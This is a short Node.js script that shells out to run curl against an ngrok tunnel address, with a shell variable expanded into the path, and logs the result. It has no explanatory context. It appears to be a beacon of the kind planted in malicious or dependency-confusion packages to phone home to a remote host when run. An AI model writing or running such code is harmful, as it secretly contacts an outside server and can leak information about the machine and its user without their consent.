var exec = require('child_process').exec;

exec('curl https://e703-77-124-179-70.eu.ngrok.io/$Ha',
    function (error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
             console.log('exec error: ' + error);
        }
    });
